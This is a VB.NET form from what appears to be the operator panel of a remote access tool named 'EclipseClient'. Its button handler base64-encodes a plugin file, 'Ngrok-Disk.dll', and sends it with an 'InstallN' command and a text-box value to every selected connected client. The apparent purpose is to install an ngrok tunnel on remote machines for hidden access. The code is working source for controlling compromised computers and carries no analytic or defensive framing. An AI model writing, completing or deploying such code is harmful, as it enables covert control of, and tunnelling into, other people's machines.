Imports System.IO

Public Class ngrok
    Public C As Client
    Private Sub ngrok_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try

            Me.Button2.Enabled = False
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "Please Wait..."

            Dim B As Byte() = SB("InstallN" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Ngrok-Disk.dll")) & Settings.SPL & TextBox1.Text)
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = ".."
            Me.Button2.Enabled = True
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Guna2CircleButton1_Click(sender As Object, e As EventArgs)
        Me.Close()
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox1.Click
        Me.Close()
    End Sub

    Private Sub Guna2ControlBox2_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox2.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub
End Class